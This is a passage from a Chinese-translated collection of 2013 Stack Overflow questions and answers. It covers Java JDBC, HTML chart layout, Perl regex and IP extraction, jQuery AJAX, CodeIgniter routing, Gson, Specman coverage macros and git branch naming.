                System.out.print("\t USER_I_ID: " +no);
                /*String std_name = rs.getString("name");
                System.out.print(" \t First_name : " + std_name);
                String std_course = rs.getString("course");
                System.out.print(" \t course : " + std_course);*/
                Blob std_image = rs.getBlob("image");
                System.out.print(" \t std_images : SS" + std_image);
            }
        }

        catch(SQLException se)
        {
            //Handle errors for JDBC
            se.printStackTrace();
        }catch(Exception e)
        {
            //Handle errors for Class.forName
            e.printStackTrace();
        }finally
        {
            //finally block used to close resources
            try{
                if(stmt!=null)
                    stmt.close();
            }catch(SQLException se2){
            }// nothing we can do
            try{
                if(conn!=null)
                    conn.close();
            }catch(SQLException se){
                se.printStackTrace();
            }//end catch try

        }//end finally

    }//end main
}//end FirstExample 
```

现在我使用的dll函数是：

```
int AddFpUser ( BOOL bSorC, BYTE FacID, int nTmlSize, BYTE *pTemplate, const char *UserName, const char *UserID, BYTE GroupID, BYTE FingerID, BYTE UserType ). 
```

所以请使用上面程序的这个功能。该函数定义包含存储图像..所以请给出答案。感谢您的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T05:34:05.570

在我看来像一个简单的数据库插入操作。

首先：您为什么要尝试使用“c”函数进行此操作。java不提供的这个函数中写了什么。**如果没有，那么在java中重新编写相同的函数。**就像无缘无故地弄乱语言一样。

其次，我不认为在这里创建一个jdbc连接有什么用，因为如果你想使用一个用dll编写的函数，它应该创建自己的db-connection。

对于使用 dll 函数，请查看 JNI。

[http://docs.oracle.com/javase/6/docs/technotes/guides/jni/](http://docs.oracle.com/javase/6/docs/technotes/guides/jni/)

# html - 有没有人知道在 html 中对齐脚本标签？因为我必须在另一个下方对齐脚本标签

> ID：15738099
> 
> 赞同：2
> 
> 时间：2013-04-01T05:27:40.063
> 
> 标签：html, whitespace, indentation, code-formatting

我正在使用 jquery 为移动设备开发网站。我必须使用 Bar、pie、line 等图表，因为这是通过 Javascript 实现的。我已经导入了我需要的所有图表。但我必须将这些图表在一条垂直线上一一对齐。所以请帮助我实现这一目标。以下是我的代码。我也摆弄过它，但我没有得到完整的输出。[http://jsfiddle.net/2VPUX/1/](http://jsfiddle.net/2VPUX/1/)

```
<!doctype html> 

<script src="http://code.shutterstock.com/rickshaw/vendor/d3.v2.js"></script> 
<script src="http://code.shutterstock.com/rickshaw/rickshaw.min.js"></script> 
Bar Graph 
<div id="chart"></div> 
<script> 
    var graph = new Rickshaw.Graph( {
    element: document.querySelector("#chart"),
    width: 400,
    height: 850,
    renderer: 'bar',
    series: [ {
    data: [ { x: 0, y: 40 }, { x: 1, y: 49 }, { x: 2, y: 38 }, { x: 3, y: 30 },   { x: 4, y: 32 } ],
        color: 'Black'
    } ]
    } );
    graph.render();
    </script> 

    <div id="chart" align="left"></div>
    <script> 
      var graph = new Rickshaw.Graph({
      element: document.querySelector("#chart"),
      width: 400,
      height: 850,
      renderer: 'line',
      series: [{
      data: [ { x: 0, y: 40 }, { x: 1, y: 49 }, { x: 2, y: 38 }, { x: 3, y: 30 },  { x: 4, y: 32 } ],
          color: 'Red'
      }, {
      data: [ { x: 0, y: 20 }, { x: 1, y: 24 }, { x: 2, y: 37 }, { x: 3, y: 15 },  { x: 4, y: 16 } ],
      color: 'Black'
}]
  });
     graph.render();
    </script> 

    <script type="text/javascript" src="https://www.google.com/jsapi"></script>
    <script type="text/javascript">
  google.load("visualization", "1", {packages:["corechart"]});
  google.setOnLoadCallback(drawChart);
  function drawChart() {
    var data = google.visualization.arrayToDataTable([
      ['Vehicle Sales', 'Per Year'],
      ['Cars',     15],
      ['Bus',      12],
      ['Lorry',  10],
      ['Two Wheeler', 45],
      ['Others',    18]
    ]);

    var options = {
      title: 'Pie Chart'
    };

    var chart = new  google.visualization.PieChart(document.getElementById('chart_div'));
    chart.draw(data, options);
  }
   </script>
  </head>
 <body>
   <div id="chart_div" align="left" style="width: 900px; height: 600px; float: left">     </div>
  </body>
   <div id="chart" align="left"></div> 
   <script> 
      var graph = new Rickshaw.Graph( {
element: document.querySelector("#chart"),
width: 435,
height: 200,
renderer: 'area',
stroke: true,
series: [ {
    data: [ { x: 0, y: 40 }, { x: 1, y: 49 }, { x: 2, y: 38 }, { x: 3, y: 30 }, { x: 4, y: 32 } ],
    color: 'Maroon'
} ]
  } );
     graph.render();

    </script> 
      <div id="chart"></div> 
     <script> 
      var graph = new Rickshaw.Graph( {
element: document.querySelector("#chart"),
width: 1000,
height: 85,
renderer: 'scatterplot',
stroke: true,
padding: { top: 0.05, left: 0.05, right: 0.05 },
series: [ {
    data: [ { x: 0, y: 40 }, { x: 1, y: 49 }, { x: 2, y: 38 }, { x: 3, y: 30 }, { x: 4, y: 32 }, { x: 5, y: 40 }, { x: 6, y: 49 }, { x: 7, y: 38 }, { x: 8, y: 30 }, { x: 9, y: 32}  ],
    color: 'Black'
} ]
 } );
   graph.render();

   </script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-05T02:34:54.810

> 我必须将这些图表在一条垂直线上一一对齐

```
#container { display: block; }
```

```
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
<rect x="25" y="15" height="15" width="15" style="fill:red;"/>
<rect x="25" y="45" height="15" width="15" style="fill:black;"/>
<rect x="25" y="75" height="15" width="15" style="fill:green;"/>
</svg>
```

# jquery - nodejs 和 socket.io 与 lua 服务器开发

> ID：15738100
> 
> 赞同：2
> 
> 时间：2013-04-01T05:27:40.997
> 
> 标签：jquery, node.js, mongodb, lua, socket.io

需要一些关于使用 lua 编写的代码和 nodejs 和 socket.io 构建服务器的建议。我听说 lua 更快，所以我想用 lua 编写服务器。和带有 socket.io 的 websockets。在我的基本想法中，luvit、nodelua 等是 nodejs 的 lua 模块。

现在我需要知道哪个模块最适合使用 lua、nodejs 和 socket.io 构建服务器？

记得我会使用 mongodb 进行数据存储。

建议我一个合适的模块！

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T15:23:26.240

看看[https://github.com/creationix/moonslice-luv](https://github.com/creationix/moonslice-luv)

Moonslice 是接口和 lua 库的集合。

它融合了 luvit 项目的代码和技术，以及一些新的实验性 API，旨在使其对 lua 更友好且更易于编码

# xml - Xerces 解析器在解析包含“&”运算符的 XML 文件时出错

> ID：15738105
> 
> 赞同：1
> 
> 时间：2013-04-01T05:28:10.070
> 
> 标签：xml

Xerces 解析器在解析包含“&”运算符的 XML 文件时出错。XML 文件（UTF-8 编码）可以包含“&”运算符吗？

- 谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T05:32:01.937

看看这个网站上的这个答案：

[在 XML 中转义 & 符号](https://stackoverflow.com/questions/1328538/how-do-i-escape-ampersands-in-xml)

您也可以使用 CDATA 标签。

```
<![CDATA[My &&&&& ampersands.]]> 
```

# telerik-mvc - Telerik MVC razor - 如何获取所有已检查的记录

> ID：15738110
> 
> 赞同：2
> 
> 时间：2013-04-01T05:29:11.637
> 
> 标签：telerik-mvc

我在 Razor 中使用 MVC 网格并具有以下网格：

```
@(Html.Telerik().Grid<MVC.Models.List>()
            .Name("grid")
            .Columns(columns =>
            {
                columns.Bound(c => c.Id)
                    .HeaderTemplate(
                        @<text>
                            <input type="checkbox" title="check all records" id="checkAllRecords"   />
                        </text>
                    )

                    .ClientTemplate("<input type='checkbox' name='checkedRecords' value='<#= Id #>'")
                    .Template(
                        @<text>
                        <input name="checkedRecords" type="checkbox"
                            value="@item.Id" title="checkedRecords" />
                    </text>)

                    .Width(50)
                    .HeaderHtmlAttributes(new { style = "text-align:center" })
                    .HtmlAttributes(new { style = "text-align:center" });
                columns.Bound(p => p.Description).Width(100);

            })
            .DataBinding(d => d.Ajax().Select("List", "Home"))
           ) 
```

我想知道是否有办法获取使用 javascript 检查的记录的所有 ID？谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T20:20:08.550

看起来像是这里的一些简单 jQuery 的案例..

```
//Array for ids
var ids = new Array();

//Go through each item in the checked box list with name checkedRecords
//if the item in question is checked then insert it's value into an array
$('input[name=checkedRecords]').each(function () {
     if ($(this).is(':checked')) {
         ids[ids.length] = $(this).val();
     }
} 
```

# perl - Perl中用括号替换句子的问题

> ID：15738123
> 
> 赞同：0
> 
> 时间：2013-04-01T05:30:38.783
> 
> 标签：perl

我有一个句子需要在某些修改后替换。

但是，该句子不会在我的原始文件中替换，因为它包含圆括号。我如何确保它被替换，因为圆括号的存在在句子中并不总是必要的。

例如。`$table=~s/<table-wrap-foot>($foot1)<\/table-wrap-foot>/$foot/sg;` 在这里，$foot 可能有也可能没有圆括号。我什至尝试过使用`\Q$foot\E`，但它无法正常工作。！

任何帮助，将不胜感激

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T13:14:41.803

尝试通过正则表达式对任意输入执行此操作将导致疯狂。使用[XML::Twig](http://search.cpan.org/perldoc/XML%3a%3aTwig)：

```
#!/usr/bin/env perl

use 5.012;
use strict;
use warnings;

use XML::Twig;

my $xml = <<EO_XML;
<table-wrap-foot>
translocations or inversions: t(8;21), inv(16) or
t(16;16), t(15;17), t(9;11), t(v;11)(v;q23),
t(6;9), inv(3) or t(3;3)
</table-wrap-foot>
EO_XML

my $t = XML::Twig->new;
$t->parse($xml);

say $t->root->first_child_text; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T06:02:34.350

如果您想在搜索值中包含括号，则需要转义转义括号的反斜杠。替换中的括号不会成为问题，但它会在匹配中，因为它们用于在正则表达式中进行分组。

假设您有一个分配给`$table`您的值，您只想传递您想要搜索和替换的文本。

以下示例将替换字符串中的`(hello)`with ：`hi``<table-wrap-foot>(hello)</table-wrap-foot>`

```
#!/usr/bin/perl

$foot = "(hello)";
print $foot . "\n";                     # $foot = (hello)
# replace all ( and ) with \( and \)
$foot =~ s/(\(|\))/\\$1/sg;             # $foot = \(hello\)
print $foot . "\n";

# replace with "hi"
$table = "<table-wrap-foot>(hello)</table-wrap-foot>";
print $table . "\n";
$table =~ s/<table-wrap-foot>($foot)</table-wrap-foot>/hi/sg;
print $table; 
```

输出：

```
> perl test.pl 
(hello)
\(hello\)
<table-wrap-foot>(hello)</table-wrap-foot>
hi 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-01T06:02:16.350

在正则表达式中，`(`和`)`是特殊字符（用于分组）。要从字面上匹配它们，请像`\(`and一样将它们转义`\)`。

要选择匹配某些内容，请使用`?`量词。

所以你的正则表达式变成：

```
$table=~s/<table-wrap-foot>\(?$foot1\)?<\/table-wrap-foot>/$foot/sg; 
```

或使用*扩展*语法，以提高可读性：

```
$table =~ s{
  <table-wrap-foot>      # beginning marker
  \(?                    # optional opening paren
  $foot1                 # the original sentence
  \)?                    # optional clonsing paren
  </table-wrap-foot>     # closing marker
}{$foot}xsg; 
```

请注意，`x`正则表达式末尾的 表示您可以在表达式中使用注释，并且忽略普通空格（使用`\s`或`[ ]`匹配它）。此外，如果您`s{}{}`用作分隔符，则不再需要转义`/`结束标记中的 。

[perldoc perlop](http://perldoc.perl.org/perlop.html#Regexp-Quote-Like-Operators)中的更多内容：Regexp Quote-Like Operators 。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-02T11:19:35.023

找不到出路..所以做了一个技巧..在开始操作文件之前将括号替换为自制实体，然后在将结果打印回文件之前将其替换为相同的实体...

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-01T05:54:44.467

尝试这个：

```
$table=~s/<table-wrap-foot>[\(]*$foot1[\)]*<\/table-wrap-foot>/$foot/sg; 
```

这样，您将括号视为普通字符，并要求它们的 0 或 1 个巧合。

# jquery - 替换复杂标题中的样式表

> ID：15738124
> 
> 赞同：1
> 
> 时间：2013-04-01T05:30:42.743
> 
> 标签：jquery, html, css, stylesheet

我有一个需要为其创建样式表切换器的网站。现在，当涉及到 html/css/js 的所有内容时，我几乎是自学成才，所以请提前原谅我的新手。我修改了一些代码以满足我的需要，但我似乎找不到如何更改代码以针对头部的特定行。

目前这就是我所拥有的：

```
<ul id="nav">
    <li><a href="#" rel="http://files.enjin.com/149304/theme-dark.css">Dark</a></li>
    <li><a href="#" rel="http://files.enjin.com/149304/theme-light.css">Light</a></li>
</ul>

<script>
$(document).ready(function() { 
    $("#nav li a").click(function() { 
        $("link").attr("href",$(this).attr('rel'));
        return false;
    });
});

$(document).ready(function() { 
    if($.cookie("css")) {
        $("link").attr("href",$.cookie("css"));
    }
    $("#nav li a").click(function() { 
        $("link").attr("href",$(this).attr('rel'));
        $.cookie("css",$(this).attr('rel'), {expires: 365, path: '/'});
        return false;
    });
});

$(document).ready(function() { 
    if($.cookie("css")) {
        $("link").attr("href",$.cookie("css"));
    }
    $("#nav li a").click(function() { 
        $("link").attr("href",$(this).attr('rel'));
        $.cookie("css",$(this).attr('rel'), {expires: 365, path: '/'});
        return false;
    });
});
</script> 
```

就目前而言，这段代码只是改变了头部的每个href并破坏了页面。

这是我需要更改的 href（它位于第 22 行）：

```
<link href="./Home - Oceanian Gaming Community_files/theme.php" media="screen" rel="stylesheet" type="text/css"> 
```

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T05:39:44.730

您不能通过源代码中的行号遍历 DOM 元素。

您需要使用某种技术来区分需要更改的链接标签。一个简单的建议是使用自定义属性。

例如：

```
<link xtype="1" href="./Home - Oceanian Gaming Community_files/theme.php"  ... > 
```

现在，您可以通过选择器引用它并轻松操作它。

```
$(document).ready(function() { 
    $("#nav li a").click(function() { 
        $("link[xtype="1"]").attr("href", $(this).attr('rel'));
        return false;
    });
}); 
```

以上是您为此目的唯一需要的准备好的处理程序。

* * *

一个稍微冒险的解决方案是使用属性包含选择器来匹配特定的链接标签。风险在于，这可能会匹配多个链接标签，具体取决于您页面上的内容。

```
$("link[href*="/theme.php"]") 
```

* * *

**审查网站后**编辑：****

 **好的，所以有几件事是不正确的。

首先，引号是错误的 - 你需要 $('link[href*="/theme.php"]') 即单外，双内的模式（反之亦然，但两个地方不一样） .

其次，在您更改一次后，模式 href*="/theme.php" 将不会再次匹配，因为我们已经更改了 href 属性。因此，在您第一次更改时添加一个自定义属性，`href`并从第二次开始使用此自定义属性来匹配您的链接标签。

```
if($('link[xtype]').length == 0) {
    // first time - set href and add custom attribute
    $('link[href*="/theme.php"]').attr("href", $(this).attr('rel')).attr('xtype', 1);
}
else {
    // second time on wards
    $('link[xtype]').attr("href", $(this).attr('rel')).attr('xtype', 1);
} 
```**

# perl - Perl 从字符串中获取 IP 地址

> ID：15738131
> 
> 赞同：1
> 
> 时间：2013-04-01T05:31:26.910
> 
> 标签：perl

从下面的输出中，我只想创建一个可以存储所有 IP 地址的数组。

IP 示例：57.35.47.54

输出：

```
Codes: '!' - success, 'Q' - request not sent, '.' - timeout,
  'L' - labeled output interface, 'B' - unlabeled output interface,
  'D' - DS Map mismatch, 'F' - no FEC mapping, 'f' - FEC mismatch,
  'M' - malformed request, 'm' - unsupported tlvs, 'N' - no label entry,
  'P' - no rx intf label prot, 'p' - premature termination of LSP,
  'R' - transit router, 'I' - unknown upstream index,
  'X' - unknown return code, 'x' - return code 0

Type escape sequence to abort.

  0 57.35.47.54 MRU 4470 [Labels: implicit-null/1852 Exp: 0/0]
I 1 57.35.47.53 MRU 4470 [Labels: 16176 Exp: 0] 328 ms
L 2 57.35.57.1 MRU 4470 [Labels: explicit-null/2795 Exp: 0/0] 140 ms
D 3 57.35.7.105 MRU 4470 [Labels: 16228 Exp: 0] 364 ms
I 4 57.35.4.78 MRU 4470 [Labels: implicit-null/16304 Exp: 0/0] 196 ms
L 5 57.35.7.66 MRU 4470 [Labels: 16613 Exp: 0] 216 ms
L 6 57.35.4.38 MRU 4470 [Labels: implicit-null/implicit-null Exp: 0/0] 216 ms
! 7 57.35.4.122 288 ms 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T05:41:23.713

也许以下内容会有所帮助：

```
use strict;
use warnings;
use Regexp::Common qw/net/;

my @IPs;

while (<DATA>) {
    push @IPs, $1 while /($RE{net}{IPv4})/g;
}

print "$_\n" for @IPs;

__DATA__
Codes: '!' - success, 'Q' - request not sent, '.' - timeout,
'L' - labeled output interface, 'B' - unlabeled output interface,
'D' - DS Map mismatch, 'F' - no FEC mapping, 'f' - FEC mismatch,
'M' - malformed request, 'm' - unsupported tlvs, 'N' - no label entry,
'P' - no rx intf label prot, 'p' - premature termination of LSP,
'R' - transit router, 'I' - unknown upstream index,
'X' - unknown return code, 'x' - return code 0
Type escape sequence to abort.
0 57.35.47.54 MRU 4470 [Labels: implicit-null/1852 Exp: 0/0]
I 1 57.35.47.53 MRU 4470 [Labels: 16176 Exp: 0] 328 ms
L 2 57.35.57.1 MRU 4470 [Labels: explicit-null/2795 Exp: 0/0] 140 ms
D 3 57.35.7.105 MRU 4470 [Labels: 16228 Exp: 0] 364 ms
I 4 57.35.4.78 MRU 4470 [Labels: implicit-null/16304 Exp: 0/0] 196 ms
L 5 57.35.7.66 MRU 4470 [Labels: 16613 Exp: 0] 216 ms
L 6 57.35.4.38 MRU 4470 [Labels: implicit-null/implicit-null Exp: 0/0] 216 ms
! 7 57.35.4.122 288 ms 
```

输出：

```
57.35.47.54
57.35.47.53
57.35.57.1
57.35.7.105
57.35.4.78
57.35.7.66
57.35.4.38
57.35.4.122 
```

[Regexp::Common](http://search.cpan.org/dist/Regexp-Common/lib/Regexp/Common/net.pm)包含一个匹配 IPv4 地址的正则表达式，并在上面用于在每一行上捕获它们。虽然您的数据每行仅包含一个 IP 地址，但也会捕获每行的多个 IP。捕获的 IP 被`push`编入`@IPs`并最终打印出来。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T07:36:27.747

如果您无法安装缺少的 regexp:common 模块，您可以手动解析它

```
use strict;
use warnings;

while (<DATA>) {
    while(/([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})/g) {
        print "$1.$2.$3.$4\n" if ($1 < 256 && $2 < 256 && $3 < 256 && $4 <256);
    }
}

__DATA__
Codes: '!' - success, 'Q' - request not sent, '.' - timeout,
'L' - labeled output interface, 'B' - unlabeled output interface,
'D' - DS Map mismatch, 'F' - no FEC mapping, 'f' - FEC mismatch,
'M' - malformed request, 'm' - unsupported tlvs, 'N' - no label entry,
'P' - no rx intf label prot, 'p' - premature termination of LSP,
'R' - transit router, 'I' - unknown upstream index,
'X' - unknown return code, 'x' - return code 0
Type escape sequence to abort.
0 57.35.47.54 MRU 4470 [Labels: implicit-null/1852 Exp: 0/0]
I 1 57.35.47.53 MRU 4470 [Labels: 16176 Exp: 0] 328 ms
L 2 57.35.57.1 MRU 4470 [Labels: explicit-null/2795 Exp: 0/0] 140 ms
D 3 57.35.7.105 MRU 4470 [Labels: 16228 Exp: 0] 364 ms
I 4 57.35.4.78 MRU 4470 [Labels: implicit-null/16304 Exp: 0/0] 196 ms
L 5 57.35.7.66 MRU 4470 [Labels: 16613 Exp: 0] 216 ms
L 6 57.35.4.38 MRU 4470 [Labels: implicit-null/implicit-null Exp: 0/0] 216 ms
! 7 57.35.4.122 288 ms 
```

# php - 即使我给出正确的路径也无法访问特定的 URL

> ID：15738132
> 
> 赞同：0
> 
> 时间：2013-04-01T05:31:28.467
> 
> 标签：php, codeigniter, url

我正在codeigniter中开发一个应用程序。我的文件夹架构是，

控制器——前端——成员——profile.php

如果我像这样访问它`http://localhost/sample/www/index.php/frontend/members/profile`，我会收到`page not found`错误消息。

我使用的是 codeigniter 2.1.3 版，我没有做任何 URL 重定向。

我打电话就像，

```
if($result) {
                $this->session->set_userdata('irid', $result);
                redirect('frontend/members/profile');
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:16:33.543

如果错误，请更正文件系统..

```
//System File Dir = http://localhost/sample/www/

//Controller File Dir = controller/frontend/members/profile

//View File Dir = views/frontend/members/profile_view.php

// Controller - profile.php
if ( ! defined('BASEPATH')) exit('No direct script access allowed');
class Profile extend CI_Controller{
   function index(){
      $this->load->view('profile_view'); // you need to load the view like this..
   }
} 
```

一般来说，在此过程中发生的错误是由您的控制器产生的。`profile.php`它往往会拉动视图。但找不到它的具体位置。这就是为什么它不断告诉文件或页面不存在或无法加载

*注意：如果您想完全操纵每个阶段的隔离，如果您只是将 CI 转换为 hmvc 模式，那么它会很有用并且压力会更小，就像`/registation,/profile,/auth,/home`*

# jquery - 使用 jquery 从 Selectchain 下拉框中发送多个数据

> ID：15738137
> 
> 赞同：0
> 
> 时间：2013-04-01T05:32:03.200
> 
> 标签：jquery, ajax, drop-down-menu

如何在选择链下拉框中发送多个数据，

过程 1 获取变量 kd_jenis 并发布到 ambilkota.php

```
<script type="text/javascript">
var htmlobjek;
$(document).ready(function(){

 $("#kd_jenis").change(function(){
 var kd_jenis = $("#kd_jenis").val(); 
```

POST kd_jenis 变量

```
 $.ajax({
    url: "ambilkota.php",
    data: "kd_jenis="+kd_jenis,
    cache: true,
    success: function(msg){

        $("#kd_fungsi").html(msg);
    }
});
}); 
```

过程 #2 我希望来自过程 1 的 kd_jenis 和 kd_fungsi 发布到下一页 ambilbiaya.php

```
 $("#kd_fungsi").change(function(){
var kd_fungsi = $("#kd_fungsi").val(); 
```

从第一步开始发布 kd_jenis 变量，从第二步开始发布 kd_fungsi，因此它将发送 2 个数据

```
$.ajax({
    url: "ambilbiaya.php",

    data: 'kd_jenis='+kd_jenis+'kd_fungsi='+kd_fungsi,
    cache: true,
    success: function(msg){

        $("#kd_sebutan").html(msg);
    }
});
});
}); 
```

但是第二个过程不起作用..我仍然无法从第一步发送数据kd_jenis到第3步。它只会发送kd_fungsi ...

请帮帮我...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T05:36:37.453

如果两者都在同一页面中，那么您可以直接发送值，

尝试这个

过程#2

```
...
data: 'kd_jenis='+ $("#kd_jenis").val() +'kd_fungsi='+kd_fungsi,
... 
```

# java - 如何将 facebook 响应转换为 json 格式的字符串？

> ID：15738143
> 
> 赞同：0
> 
> 时间：2013-04-01T05:32:47.847
> 
> 标签：java, json, facebook-graph-api, gson, restfb

我正在尝试从 Facebook 获取查询响应并将其映射到用户定义的类：

我有以下课程：

```
class FBStory {
        @Field
        private String application_id;
        @Field
        private String application_name;
        @Field
        private String caption;
        @Field
        private String created_time;
        @Field
        private String description;
        @Field
        private String from;// user_Id
        @Field
        private String message;
        @Field
        private String name;
        @Field("objectId")
        private String object_id;
        @Field
        private String privacy;
        @Field("statusType")
        private String status_type;
        @Field
        private String story;
        @Field("storyId")
        private String id;
        @Field("storyUrl")
        private String link;
        @Field
        private String type;
        @Field
        private String updated_time;
        @Field
        private Set<CommentInfo> comments = new HashSet<CommentInfo>();//set of comment Id
        @Field
        private Set<String> likes = new HashSet<String>();
        @Field("storyTags")
        private Set<String> story_tags = new HashSet<String>();
} 
```

查询的 facebook 响应是：

```
Post[actions=[] application=null attribution=null caption=null comments=Comments[count=0 data=[]] createdTime=Mon Apr 01 08:16:28 IST 2013 description=null from=CategorizedFacebookType[category=null id=100000363414872 metadata=null name=Nitin Thokare type=null] icon=null id=100000363414872_555878751100900 likes=null likesCount=null link=null message=null messageTags={} metadata=null name=null objectId=null picture=null place=null privacy=Privacy[deny=null description=null friends=null networks=null value=] properties=[] source=null to=[] type=status updatedTime=Mon Apr 01 08:16:28 IST 2013 withTags=[]] 
```

我试图使用以下方法将上述响应转换为上述类的对象：

```
storyObj = gson.fromJson(restFBResponse.toString(), SolrFBStoryDoc.class); 
```

但是对于`gson.fromJson()`第一个参数应该是`JSON`格式的字符串。因此，我收到上述代码行的错误：

```
com.google.gson.JsonSyntaxException: java.lang.IllegalStateException: Expected BEGIN_OBJECT but was STRING at line 1 column 5 
```

有什么方法可以转换`restFBResponse`为正确的`Json`字符串，然后作为第一个参数传递给`gson.fromJson()`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T09:41:45.430

我发现使用 Solr Beans 是可能的，但是使用 Solr bean 会产生它自己的问题，其中一个问题是[这里](https://stackoverflow.com/questions/15204380/solr-beans-invalid-setter-method-must-have-one-and-only-one-parameter-without/15204841?noredirect=1#comment22370385_15204841)讨论的。所以，为了克服这个问题，我收到了来自 Facebook 的响应，`JsonObject.class`格式为（即 connectionType），而不是`Post.class`如下所示：

```
data = facebookClient.fetchConnection(connection, t, parameters)

where, 'fetchConnection' is defined as,

<T> Connection<T> fetchConnection(String connection, Class<T> connectionType, Parameter... parameters); 
```

# specman - 如何动态限制specman中的覆盖项目范围？

> ID：15738144
> 
> 赞同：1
> 
> 时间：2013-04-01T05:32:49.997
> 
> 标签：specman, function-coverage

信号 x 是位“n”的一个热信号我想只涵盖信号的一个热值而不对其他值感兴趣。

例如：如果信号 x 是 3 位，那么我想 x 是否达到低于值的值不是。

```
x == 3'b001
x == 3'b010
x == 3'b100 
```

我尝试在下面实现目标。

```
struct ABC {
 x :uint(bits:n);
 event pqrs;
 cover pqrs is {
   item x using ranges={
                         range([1]);
                         range([2]);
                         range([4]);
                       };
 }; 
```

但是上面的代码并不优雅，因为 'n' `定义了可以根据环境变化的值。请帮助我如何为上述案例撰写报道。

提前感谢大家的帮助。问候， 斯里坎特

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-03-06T16:15:53.870

您可以编写一个简单的“定义为计算”宏来执行此操作。我在下面写了一个简短的例子。

宏应如下所示：

```
 define <RANGE1'struct_member> "COVER_ITEM_WITH_DEFAULT_RANGES <struct_member>" as computed { 

var x:uint(bits:NBITS) = 1;
var str := append( "cover covT_e is also {",
  "item ", <1>," using ranges = {");
while(x!=0){
    str =append(str,"range([",x,"]);");
    x=x<<1;
};
  str=append(str,        "};",
                  "}"
                );
return str;
}; 
```

你可以像这样在你的代码中使用它：

```
<'
define NBITS 4;
import cover0;

extend sys {

 field1 : uint(bits:NBITS);
event covT_e;

cover covT_e is empty;          

COVER_ITEM_WITH_DEFAULT_RANGES field1;

run() is also {
    for i from 1 to 20 {
        gen field1;
          emit covT_e;
        print field1;
    }; // for i from 1 to...
}; // run() is also

finalize() is also{
    specman("show cover");
};
}; // extend sys
'> 
```

希望这可以帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T08:16:29.017

您可以自己编写一个定义为计算的宏来创建覆盖组。请注意，宏必须扩展为完整的句法元素，您不能只创建一个创建范围表达式的宏。（我有这样的宏，但不能透露）。

托尔斯滕。

# windows - git - 两个名称相同的分支？区别是一种小写 - 一种混合大小写？

> ID：15738147
> 
> 赞同：4
> 
> 时间：2013-04-01T05:32:57.973
> 
> 标签：windows, git, git-branch

我已经习惯了输入 camelCase，所以我一直在 git 中输入。那是 - 直到我意识到 git 是区分大小写的！包括文件名。

从历史上看——在这个生产分支的开始——它是 ClientMgr。但只是一开始。

初始提交之后的所有工作 - 都在分支上 - clientmgr。

几个小时前 - 我意识到了这个问题。由于树是直的 - 而不是分支 - 我尝试删除 ClientMgr。紧接着 - 在一切都干净之前，我有 195 个新文件。

不确定 - 我恢复了备份 - 但现在有两个分支 - 同名 - 不同的情况。

我是否继续 - 只是忽略 ClientMgr？还是有一种理智的方法来清理它？

我真的很想得到一个。我有一些想法 - 但厌倦了 gitting 拍摄它......

任何和所有建议表示赞赏。

PS - 猜想这有助于解释为什么我几天前有一些丢失/丢失的更改。

我喜欢 git - 希望能够过去或大部分时间都过去了 got-ya 的 +++++++++++++++++++++++ 编辑：2013 年 4 月 1 日

ClientMgr 是原始分支 - 一次提交。我继续工作（以为我在 ClientMgr 分支上，而是在新的 clientmgr 分支上。

我担心因为同名 - 我认为不同的情况是潜在的定时炸弹。那是我怀疑的-git主要将它们视为分开的-但并非总是如此。例如 - 在 ClientMgr 上 - 并尝试检查 clientmgr - 我收到一条错误消息，表明我已经在上面了。

看到这一点 - 可能还有其他问题迫在眉睫。

我认为我的第一步将是再次备份 - 然后尝试将 ClientMgr 重命名为不相似的地方 - 并测试并看看情况如何。

一切顺利——至少我已经（或可能已经）照顾好了

再一次 - 我非常感谢大家的意见。

吉姆·H

+++++++++++++++++++++++++++++编辑2

不是预期的 - 但似乎还可以

我通过 git branch -m ClientMgr oldclientmgr 将 ClientMgr 重命名为 oldclientmgr

查看 SourceTree 中的树 - 它都重命名为 oldclientmgr 我检查了图表 - 我看起来是我想去的地方 我打开并查看了代码 - 它看起来正确到位

所以正如我所想 - git 并不总是区分大小写 - 否则它不会重命名两个分支。

再次感谢您！

吉姆·H

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:00:34.173

如果您继续在两个独立的分支上工作（或者在一个分支上做了一些工作，然后在另一个分支上做了一些工作），您需要合并这些更改。这可以通过两种方式完成：

1.  您可以使用`git merge`（在分支`clientmgr`调用时`git merge ClientMgr`）
2.  您可以使用[`git rebase`](http://git-scm.com/book/en/Git-Branching-Rebasing)

第二种解决方案有点困难，尤其是当您不熟悉 git 时。两种解决方案都可能需要您解决冲突，因为两个分支中的更改可能不兼容。如果`ClientMgr`分支直接来自`clientmgr`您的合并应该是`fast-forward`，这意味着没有可能的冲突，因为分支中的所有更改`ClientMgr`都是在分支之上进行的`clientmgr`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T19:28:25.323

请参阅对原始问题的编辑一和二。

简而言之 - 我有两个同名的分支 - 唯一的区别在于外壳。

一个是 ClientMgr - 第一个 - 只有一次提交。从那时起 - 我在 clientmgr 工作

我没有意识到我有两个——一直以来我都以为我在做一个。

通过这里发生的事情 - git 并不总是区分大小写 - 所以对我来说 - 教训总是坚持小写名称。

为了解决这些问题 - 我试图将 ClientMgr 重命名为 oldclientmgr - 但发生的事情是 - 将两者都重命名为 oldclient manager。

